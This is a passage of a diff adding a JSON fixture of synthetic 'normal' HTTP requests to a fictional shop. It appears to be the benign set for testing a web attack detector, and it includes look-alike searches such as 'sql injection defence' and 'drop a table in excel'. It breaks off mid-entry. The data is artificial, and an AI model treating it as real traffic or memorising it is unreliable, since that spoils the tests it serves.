@@ -1,0 +1,5196 @@
+{
+  "normal": [
+    {
+      "id": "n001",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n002",
+      "method": "GET",
+      "path": "/products",
+      "query": "page=2&sort=price_asc",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n003",
+      "method": "GET",
+      "path": "/products/apple-juice",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n004",
+      "method": "GET",
+      "path": "/products/orange-juice-1l",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n005",
+      "method": "GET",
+      "path": "/cart",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n006",
+      "method": "GET",
+      "path": "/checkout",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n007",
+      "method": "GET",
+      "path": "/orders/1042",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n008",
+      "method": "GET",
+      "path": "/orders/987654",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n009",
+      "method": "GET",
+      "path": "/account/profile",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n010",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=apple+juice",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n011",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=orange",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n012",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%E8%8B%B9%E6%9E%9C",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n013",
+      "method": "GET",
+      "path": "/category/beverages",
+      "query": "min_price=1&max_price=50",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n014",
+      "method": "GET",
+      "path": "/category/snacks",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n015",
+      "method": "GET",
+      "path": "/api/products",
+      "query": "limit=20&offset=40",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n016",
+      "method": "GET",
+      "path": "/api/products/550e8400-e29b-41d4-a716-446655440000",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n017",
+      "method": "GET",
+      "path": "/assets/app.4f3c9a1b2c3d4e5f.js",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n018",
+      "method": "GET",
+      "path": "/assets/vendor.deadbeefdeadbeef.css",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n019",
+      "method": "GET",
+      "path": "/assets/img/product-1024.jpg",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n020",
+      "method": "GET",
+      "path": "/reviews/1042",
+      "query": "page=1",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n021",
+      "method": "GET",
+      "path": "/blog",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n022",
+      "method": "GET",
+      "path": "/blog/2026/11/writing-good-commit-messages",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n023",
+      "method": "GET",
+      "path": "/blog/2026/10/postgres-indexes-explained",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n024",
+      "method": "GET",
+      "path": "/blog/tags/database",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n025",
+      "method": "GET",
+      "path": "/blog/tags/security",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n026",
+      "method": "GET",
+      "path": "/blog/author/jane-doe",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n027",
+      "method": "GET",
+      "path": "/blog?page=3",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n028",
+      "method": "GET",
+      "path": "/feed.xml",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n029",
+      "method": "GET",
+      "path": "/sitemap.xml",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n030",
+      "method": "GET",
+      "path": "/robots.txt",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n031",
+      "method": "GET",
+      "path": "/about",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n032",
+      "method": "GET",
+      "path": "/contact",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n033",
+      "method": "GET",
+      "path": "/dashboard",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n034",
+      "method": "GET",
+      "path": "/dashboard/reports",
+      "query": "range=30d",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n035",
+      "method": "GET",
+      "path": "/dashboard/reports/2026-10",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n036",
+      "method": "GET",
+      "path": "/dashboard/users",
+      "query": "page=2&role=editor",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n037",
+      "method": "GET",
+      "path": "/dashboard/users/42",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n038",
+      "method": "GET",
+      "path": "/dashboard/settings/notifications",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n039",
+      "method": "GET",
+      "path": "/dashboard/billing/invoices",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n040",
+      "method": "GET",
+      "path": "/dashboard/billing/invoices/INV-2026-00123",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n041",
+      "method": "GET",
+      "path": "/healthz",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n042",
+      "method": "GET",
+      "path": "/metrics",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n043",
+      "method": "POST",
+      "path": "/login",
+      "query": "",
+      "body": "email=user%40example.com&password=Example123&remember=on",
+      "content_type": "application/x-www-form-urlencoded",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n044",
+      "method": "POST",
+      "path": "/login",
+      "query": "",
+      "body": "email=user%40example.com&password=Example123&remember=on",
+      "content_type": "application/x-www-form-urlencoded",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n045",
+      "method": "POST",
+      "path": "/login",
+      "query": "",
+      "body": "email=user%40example.com&password=Example123&remember=on",
+      "content_type": "application/x-www-form-urlencoded",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n046",
+      "method": "POST",
+      "path": "/signup",
+      "query": "",
+      "body": "name=Jane+Doe&email=jane%40example.com&password=Str0ngPass%21&card_number=4111111111111111",
+      "content_type": "application/x-www-form-urlencoded",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n047",
+      "method": "POST",
+      "path": "/signup",
+      "query": "",
+      "body": "name=Jane+Doe&email=jane%40example.com&password=Str0ngPass%21&card_number=4111111111111111",
+      "content_type": "application/x-www-form-urlencoded",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n048",
+      "method": "POST",
+      "path": "/signup",
+      "query": "",
+      "body": "name=Jane+Doe&email=jane%40example.com&password=Str0ngPass%21&card_number=4111111111111111",
+      "content_type": "application/x-www-form-urlencoded",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n049",
+      "method": "POST",
+      "path": "/contact",
+      "query": "",
+      "body": "subject=Question+about+shipping&message=When+will+my+order+arrive%3F&email=jane%40example.com",
+      "content_type": "application/x-www-form-urlencoded",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n050",
+      "method": "POST",
+      "path": "/contact",
+      "query": "",
+      "body": "subject=Question+about+shipping&message=When+will+my+order+arrive%3F&email=jane%40example.com",
+      "content_type": "application/x-www-form-urlencoded",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n051",
+      "method": "POST",
+      "path": "/contact",
+      "query": "",
+      "body": "subject=Question+about+shipping&message=When+will+my+order+arrive%3F&email=jane%40example.com",
+      "content_type": "application/x-www-form-urlencoded",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n052",
+      "method": "POST",
+      "path": "/newsletter",
+      "query": "",
+      "body": "email=jane%40example.com&topics=security%2Cdatabase",
+      "content_type": "application/x-www-form-urlencoded",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n053",
+      "method": "POST",
+      "path": "/newsletter",
+      "query": "",
+      "body": "email=jane%40example.com&topics=security%2Cdatabase",
+      "content_type": "application/x-www-form-urlencoded",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n054",
+      "method": "POST",
+      "path": "/newsletter",
+      "query": "",
+      "body": "email=jane%40example.com&topics=security%2Cdatabase",
+      "content_type": "application/x-www-form-urlencoded",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n055",
+      "method": "POST",
+      "path": "/reset-password",
+      "query": "",
+      "body": "email=jane%40example.com&answer=blue&new_password=NewPass123",
+      "content_type": "application/x-www-form-urlencoded",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n056",
+      "method": "POST",
+      "path": "/reset-password",
+      "query": "",
+      "body": "email=jane%40example.com&answer=blue&new_password=NewPass123",
+      "content_type": "application/x-www-form-urlencoded",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n057",
+      "method": "POST",
+      "path": "/reset-password",
+      "query": "",
+      "body": "email=jane%40example.com&answer=blue&new_password=NewPass123",
+      "content_type": "application/x-www-form-urlencoded",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n058",
+      "method": "POST",
+      "path": "/profile",
+      "query": "",
+      "body": "display_name=Jane+Doe&bio=I+write+about+databases+and+security&website=https%3A%2F%2Fjane.example.com",
+      "content_type": "application/x-www-form-urlencoded",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n059",
+      "method": "POST",
+      "path": "/profile",
+      "query": "",
+      "body": "display_name=Jane+Doe&bio=I+write+about+databases+and+security&website=https%3A%2F%2Fjane.example.com",
+      "content_type": "application/x-www-form-urlencoded",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n060",
+      "method": "POST",
+      "path": "/profile",
+      "query": "",
+      "body": "display_name=Jane+Doe&bio=I+write+about+databases+and+security&website=https%3A%2F%2Fjane.example.com",
+      "content_type": "application/x-www-form-urlencoded",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n061",
+      "method": "POST",
+      "path": "/api/orders",
+      "query": "",
+      "body": "{\"items\": [{\"sku\": \"AJ-1L\", \"qty\": 2}], \"coupon\": \"WELCOME10\", \"notes\": \"Leave at the door\"}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n062",
+      "method": "POST",
+      "path": "/api/orders",
+      "query": "",
+      "body": "{\"items\": [{\"sku\": \"AJ-1L\", \"qty\": 2}], \"coupon\": \"WELCOME10\", \"notes\": \"Leave at the door\"}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n063",
+      "method": "POST",
+      "path": "/api/orders",
+      "query": "",
+      "body": "{\"items\": [{\"sku\": \"AJ-1L\", \"qty\": 2}], \"coupon\": \"WELCOME10\", \"notes\": \"Leave at the door\"}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n064",
+      "method": "POST",
+      "path": "/api/reviews",
+      "query": "",
+      "body": "{\"product_id\": 1042, \"rating\": 5, \"title\": \"Great juice\", \"body\": \"Arrived quickly and tasted fresh.\"}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n065",
+      "method": "POST",
+      "path": "/api/reviews",
+      "query": "",
+      "body": "{\"product_id\": 1042, \"rating\": 5, \"title\": \"Great juice\", \"body\": \"Arrived quickly and tasted fresh.\"}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n066",
+      "method": "POST",
+      "path": "/api/reviews",
+      "query": "",
+      "body": "{\"product_id\": 1042, \"rating\": 5, \"title\": \"Great juice\", \"body\": \"Arrived quickly and tasted fresh.\"}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n067",
+      "method": "POST",
+      "path": "/api/feedback",
+      "query": "",
+      "body": "{\"message\": \"The checkout page mentions javascript frameworks in the help text.\", \"rating\": 4}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n068",
+      "method": "POST",
+      "path": "/api/feedback",
+      "query": "",
+      "body": "{\"message\": \"The checkout page mentions javascript frameworks in the help text.\", \"rating\": 4}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n069",
+      "method": "POST",
+      "path": "/api/feedback",
+      "query": "",
+      "body": "{\"message\": \"The checkout page mentions javascript frameworks in the help text.\", \"rating\": 4}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n070",
+      "method": "POST",
+      "path": "/api/users/42",
+      "query": "",
+      "body": "{\"display_name\": \"Jane Doe\", \"locale\": \"en-GB\", \"timezone\": \"Europe/London\"}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n071",
+      "method": "POST",
+      "path": "/api/users/42",
+      "query": "",
+      "body": "{\"display_name\": \"Jane Doe\", \"locale\": \"en-GB\", \"timezone\": \"Europe/London\"}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n072",
+      "method": "POST",
+      "path": "/api/users/42",
+      "query": "",
+      "body": "{\"display_name\": \"Jane Doe\", \"locale\": \"en-GB\", \"timezone\": \"Europe/London\"}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n073",
+      "method": "POST",
+      "path": "/api/profile",
+      "query": "",
+      "body": "{\"bio\": \"I collect old union newsletters and select the best articles.\", \"token\": \"abc123def456\"}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n074",
+      "method": "POST",
+      "path": "/api/profile",
+      "query": "",
+      "body": "{\"bio\": \"I collect old union newsletters and select the best articles.\", \"token\": \"abc123def456\"}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n075",
+      "method": "POST",
+      "path": "/api/profile",
+      "query": "",
+      "body": "{\"bio\": \"I collect old union newsletters and select the best articles.\", \"token\": \"abc123def456\"}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n076",
+      "method": "POST",
+      "path": "/api/alerts",
+      "query": "",
+      "body": "{\"threshold\": 5, \"channels\": [\"email\"], \"secret\": \"not-a-real-secret\"}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n077",
+      "method": "POST",
+      "path": "/api/alerts",
+      "query": "",
+      "body": "{\"threshold\": 5, \"channels\": [\"email\"], \"secret\": \"not-a-real-secret\"}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n078",
+      "method": "POST",
+      "path": "/api/alerts",
+      "query": "",
+      "body": "{\"threshold\": 5, \"channels\": [\"email\"], \"secret\": \"not-a-real-secret\"}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n079",
+      "method": "POST",
+      "path": "/api/upload",
+      "query": "",
+      "body": "{\"filename\": \"quarterly-report.pdf\", \"size\": 204800, \"checksum\": \"9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08\"}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n080",
+      "method": "POST",
+      "path": "/api/upload",
+      "query": "",
+      "body": "{\"filename\": \"quarterly-report.pdf\", \"size\": 204800, \"checksum\": \"9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08\"}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n081",
+      "method": "POST",
+      "path": "/api/upload",
+      "query": "",
+      "body": "{\"filename\": \"quarterly-report.pdf\", \"size\": 204800, \"checksum\": \"9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08\"}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n082",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=how+to+select+the+best+union+representative",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n083",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=javascript+event+listeners+tutorial",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n084",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=introduction+to+sql+injection+defence",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n085",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=path+traversal+explained+for+developers",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n086",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=what+does+sleep+mean+in+shell+scripts",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n087",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=union+station+opening+hours",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n088",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=best+way+to+delete+an+old+account",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n089",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=how+to+drop+a+table+in+excel",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n090",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=select+a+colour+palette",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n091",
+      "method": "GET",
+      "path": "/docs/security/headers",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n092",
+      "method": "GET",
+      "path": "/docs/security/xss-prevention",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n093",
+      "method": "GET",
+      "path": "/docs/api/rate-limits",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n094",
+      "method": "GET",
+      "path": "/docs/api/pagination",
+      "query": "cursor=eyJpZCI6MTA0Mn0",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n095",
+      "method": "GET",
+      "path": "/docs/errors/403",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n096",
+      "method": "GET",
+      "path": "/docs/errors/404",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n097",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml",
+        "Accept-Language": "en-GB,en;q=0.9",
+        "Referer": "https://shop.example.com/"
+      },
+      "note": ""
+    },
+    {
+      "id": "n098",
+      "method": "GET",
+      "path": "/products",
+      "query": "page=2&sort=price_asc",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+        "Accept": "application/json",
+        "Referer": "https://shop.example.com/products"
+      },
+      "note": ""
+    },
+    {
+      "id": "n099",
+      "method": "GET",
+      "path": "/products/apple-juice",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n100",
+      "method": "GET",
+      "path": "/products/orange-juice-1l",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "curl/8.5.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n101",
+      "method": "GET",
+      "path": "/cart",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Go-http-client/2.0",
+        "Accept": "application/json"
+      },
+      "note": ""
+    },
+    {
+      "id": "n102",
+      "method": "GET",
+      "path": "/checkout",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml",
+        "Accept-Language": "en-GB,en;q=0.9",
+        "Referer": "https://shop.example.com/"
+      },
+      "note": ""
+    },
+    {
+      "id": "n103",
+      "method": "GET",
+      "path": "/orders/1042",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+        "Accept": "application/json",
+        "Referer": "https://shop.example.com/products"
+      },
+      "note": ""
+    },
+    {
+      "id": "n104",
+      "method": "GET",
+      "path": "/orders/987654",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n105",
+      "method": "GET",
+      "path": "/account/profile",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "curl/8.5.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n106",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=apple+juice",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Go-http-client/2.0",
+        "Accept": "application/json"
+      },
+      "note": ""
+    },
+    {
+      "id": "n107",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=orange",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml",
+        "Accept-Language": "en-GB,en;q=0.9",
+        "Referer": "https://shop.example.com/"
+      },
+      "note": ""
+    },
+    {
+      "id": "n108",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%E8%8B%B9%E6%9E%9C",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+        "Accept": "application/json",
+        "Referer": "https://shop.example.com/products"
+      },
+      "note": ""
+    },
+    {
+      "id": "n109",
+      "method": "GET",
+      "path": "/category/beverages",
+      "query": "min_price=1&max_price=50",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n110",
+      "method": "GET",
+      "path": "/category/snacks",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "curl/8.5.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n111",
+      "method": "GET",
+      "path": "/api/products",
+      "query": "limit=20&offset=40",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Go-http-client/2.0",
+        "Accept": "application/json"
+      },
+      "note": ""
+    },
+    {
+      "id": "n112",
+      "method": "GET",
+      "path": "/api/products/550e8400-e29b-41d4-a716-446655440000",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml",
+        "Accept-Language": "en-GB,en;q=0.9",
+        "Referer": "https://shop.example.com/"
+      },
+      "note": ""
+    },
+    {
+      "id": "n113",
+      "method": "GET",
+      "path": "/assets/app.4f3c9a1b2c3d4e5f.js",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+        "Accept": "application/json",
+        "Referer": "https://shop.example.com/products"
+      },
+      "note": ""
+    },
+    {
+      "id": "n114",
+      "method": "GET",
+      "path": "/assets/vendor.deadbeefdeadbeef.css",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n115",
+      "method": "GET",
+      "path": "/assets/img/product-1024.jpg",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "curl/8.5.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n116",
+      "method": "GET",
+      "path": "/reviews/1042",
+      "query": "page=1",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Go-http-client/2.0",
+        "Accept": "application/json"
+      },
+      "note": ""
+    },
+    {
+      "id": "n117",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml",
+        "Accept-Language": "en-GB,en;q=0.9",
+        "Referer": "https://shop.example.com/"
+      },
+      "note": ""
+    },
+    {
+      "id": "n118",
+      "method": "GET",
+      "path": "/products",
+      "query": "page=2&sort=price_asc",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+        "Accept": "application/json",
+        "Referer": "https://shop.example.com/products"
+      },
+      "note": ""
+    },
+    {
+      "id": "n119",
+      "method": "GET",
+      "path": "/products/apple-juice",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n120",
+      "method": "GET",
+      "path": "/products/orange-juice-1l",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "curl/8.5.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n121",
+      "method": "GET",
+      "path": "/cart",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Go-http-client/2.0",
+        "Accept": "application/json"
+      },
+      "note": ""
+    },
+    {
+      "id": "n122",
+      "method": "GET",
+      "path": "/checkout",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
